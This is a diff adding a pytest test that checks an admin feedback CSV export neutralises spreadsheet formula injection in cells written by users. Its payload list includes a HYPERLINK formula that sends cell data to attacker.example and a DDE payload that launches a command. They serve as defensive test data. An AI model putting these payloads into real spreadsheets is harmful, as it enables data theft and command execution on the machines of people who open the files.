@@ -416,3 +416,56 @@ async def test_csv_export_search_default_is_none():
 
     call_kwargs = mock_service.call_args.kwargs
     assert call_kwargs["search"] is None
+
+
+# ---------------------------------------------------------------------------
+# Spreadsheet formula injection
+# ---------------------------------------------------------------------------
+
+# Any signed-in user writes these fields: their feedback text, their project's
+# title, their display name, and (through the document they upload) the issue
+# text the model writes. Excel and Google Sheets run a cell that starts with one
+# of these characters as a formula when an admin opens the export.
+_FORMULA_PAYLOADS = [
+    '=HYPERLINK("https://attacker.example/?d="&F3,"Open")',
+    "+1+cmd|' /C calc'!A0",
+    "-2+3",
+    "@SUM(1+1)",
+    "\t=1+1",
+    "\r=1+1",
+    "\n=1+1",
+]
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("payload", _FORMULA_PAYLOADS)
+async def test_csv_neutralizes_formulas_in_user_written_cells(payload: str):
+    """A cell a user wrote never reaches the spreadsheet as a formula."""
+    mock_rows = [
+        {
+            "feedback": _make_feedback(feedback_text=payload),
+            "issue": _make_issue(
+                title=payload, description=payload, long_description=payload
+            ),
+            "project": _make_project(title=payload),
+            "user": _make_user(name=payload),
+            "workflow_run": _make_workflow_run(),
+        }
+    ]
+
+    with patch(
+        "lib.api.routers.feedback.feedback_service.get_admin_feedbacks",
+        new=AsyncMock(return_value=mock_rows),
+    ):
+        response = await export_admin_feedbacks_csv(workflow_type=None)
+
+    row = _parse_csv(await _read_streaming_response(response))[0]
+    for column in (
+        "Feedback Text",
+        "User Name",
+        "Project Title",
+        "Issue Title",
+        "Issue Description",
+        "Issue Long Description",
+    ):
+        assert row[column] == f"'{payload}", column
